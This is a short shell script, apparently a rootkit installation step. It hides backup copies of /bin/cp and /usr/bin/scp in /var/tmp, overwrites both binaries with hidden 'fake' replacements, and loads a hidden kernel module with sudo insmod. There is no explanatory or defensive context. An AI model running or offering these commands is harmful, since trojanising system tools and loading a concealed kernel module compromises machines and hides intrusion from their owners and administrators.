cp /bin/cp /var/tmp/.cp
cp /usr/bin/scp /var/tmp/.scp
mv -f /.fake_cp /bin/cp
mv -f /.fake_scp /usr/bin/scp
sudo insmod /var/tmp/.hello.ko
